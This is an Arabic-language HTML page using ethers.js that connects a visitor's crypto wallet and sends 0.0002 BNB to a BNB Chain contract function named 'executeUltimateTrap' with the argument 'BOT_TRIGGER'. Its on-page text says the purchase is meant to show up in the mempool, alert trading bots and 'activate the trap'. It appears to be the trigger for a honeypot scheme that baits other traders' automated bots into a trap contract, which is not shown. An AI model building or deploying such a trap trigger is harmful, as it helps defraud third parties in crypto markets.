<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إطلاق شرارة البوتات</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0e1117; color: #fff; font-family: monospace; text-align: center; padding-top: 50px; }
        .box { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; display: inline-block; width: 320px; }
        button { background: #f0b90b; color: #000; font-weight: bold; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 15px; }
        #log { margin-top: 15px; font-size: 12px; color: #8b949e; word-break: break-all; }
    </style>
</head>
<body>

<div class="box">
    <h3>⚡ إطلاق الشرارة (Trigger)</h3>
    <p style="font-size: 13px; color: #8b949e;">إرسال 0.0002 BNB لتسجيل أول شراء على Mempool وتنبيه البوتات</p>

    <button onclick="triggerSpark()">ربط وإطلاق الشرارة الآن 🔥</button>

    <div id="log">في انتظار الضغط...</div>
</div>

<script>
    const CONTRACT = "0xABE22Ab6C4d5ac4D96041078ec650ca7124335dE";
    const ABI = [
        "function executeUltimateTrap(string memory methodSource) public payable returns (uint[] memory amounts)"
    ];

    async function triggerSpark() {
        const log = document.getElementById("log");
        if (!window.ethereum) return log.innerText = "افتح الصفحة من محفظتك!";

        try {
            log.innerText = "جاري الاتصال...";
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();

            log.innerText = "جاري إرسال 0.0002 BNB وتفعيل الفخ...";
            const contract = new ethers.Contract(CONTRACT, ABI, signer);

            const tx = await contract.executeUltimateTrap("BOT_TRIGGER", {
                value: ethers.utils.parseEther("0.0002"),
                gasLimit: 300000
            });

            log.innerText = "جاري تأكيد المعاملة في البلوكشين...";
            await tx.wait();

            log.innerText = "🚀 تم إطلاق الشرارة بنجاح! المعاملة مسجلة الآن على BscScan.";
        } catch (err) {
            log.innerText = "خطأ: " + (err.reason || err.message);
        }
    }
</script>

</body>
</html>
